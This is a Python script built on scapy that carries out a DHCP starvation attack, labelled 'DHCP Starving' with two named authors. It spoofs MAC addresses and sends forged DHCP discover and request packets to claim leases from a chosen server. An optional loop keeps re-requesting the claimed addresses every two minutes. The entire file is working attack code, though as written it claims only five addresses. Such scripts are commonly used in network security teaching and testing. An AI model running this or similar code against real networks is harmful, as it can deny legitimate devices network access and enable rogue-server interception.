import random
import sys
import argparse
from time import sleep
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sniff
from scapy.utils import mac2str


def dhcpDiscover(src_mac_random, dhcp_server_ip, interface):
    options = [("message-type", "discover"),
               ("max_dhcp_size", 1500),
               ("client_id", mac2str(src_mac_random)),
               ("lease_time", 10000),
               ("end", "0")]
    transaction_id = random.randint(1, 900000000)
    dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff', src=src_mac_random) \
                    / IP(src='0.0.0.0', dst=dhcp_server_ip) \
                    / UDP(sport=68, dport=67) \
                    / BOOTP(chaddr=[mac2str(src_mac_random)], xid=transaction_id, flags=0xffffff) \
                    / DHCP(options=options)
    sendp(dhcp_discover, iface=interface)
    dhcp_offer = sniff(count=1, lfilter=lambda p: BOOTP in p and p[BOOTP].xid == transaction_id)
    return dhcp_offer


def dhcpRequest(dhcp_offer, src_mac_random, interface):
    transaction_id = dhcp_offer[0][BOOTP].xid
    server_id = dhcp_offer[0][DHCP].options[1][1]
    requested_addr = dhcp_offer[0][BOOTP].yiaddr
    print(requested_addr)
    options = [("message-type", "request"),
               ("server_id", server_id),
               ("requested_addr", requested_addr),
               ("end", "0")]
    dhcp_request = Ether(dst='ff:ff:ff:ff:ff:ff', src=src_mac_random) \
                   / IP(src='0.0.0.0', dst='255.255.255.255') \
                   / UDP(sport=68, dport=67) \
                   / BOOTP(chaddr=[mac2str(src_mac_random)], xid=transaction_id) \
                   / DHCP(options=options)
    sendp(dhcp_request, iface=interface)
    return requested_addr


def persistant(mac_and_ip, dhcp_server_ip, interface):
    while (True):
        for i in mac_and_ip:
            transaction_id = random.randint(1, 900000000)
            server_id = dhcp_server_ip
            requested_addr = i[0]
            options = [("message-type", "request"),
                       ("server_id", server_id),
                       ("requested_addr", requested_addr),
                       ("end", "0")]
            dhcp_request = Ether(dst='ff:ff:ff:ff:ff:ff', src=i[1]) \
                           / IP(src=requested_addr, dst='255.255.255.255') \
                           / UDP(sport=68, dport=67) \
                           / BOOTP(chaddr=[mac2str(i[1])], xid=transaction_id) \
                           / DHCP(options=options)
            sendp(dhcp_request, iface=interface)
        sleep(120)


def main():
    parser = argparse.ArgumentParser(description="DHCP Starving. by Daniel Yochanan and Avi Feder")
    parser.add_argument("-i", "--IFACE", type=str, metavar='', help="Interface you wish to use")
    parser.add_argument("-t", "--TARGET", type=str, metavar='', help="IP of target server")
    parser.add_argument("-p", "--PERSISTANT", type=bool, metavar='', help="persistant?")
    args = parser.parse_args()
    if (args.IFACE == None):
        interface = "eth0"
    else:
        interface = args.IFACE
    if (args.TARGET == None):
        dhcp_server_ip = "255.255.255.255"
    else:
        dhcp_server_ip = args.TARGET

    mac_and_ip = []
    for i in range(50, 55):
        dhcp_offer = dhcpDiscover(f"02:00:4c:4F:4F:{i}", dhcp_server_ip, interface)
        requested_addr = dhcpRequest(dhcp_offer, f"02:00:4c:4F:4F:{i}", interface)
        mac_and_ip += [(requested_addr, f"02:00:4c:4F:4F:{i}")]


    if (args.PERSISTANT == True):
        persistant(mac_and_ip, dhcp_server_ip, interface)


if __name__ == '__main__':
    main()
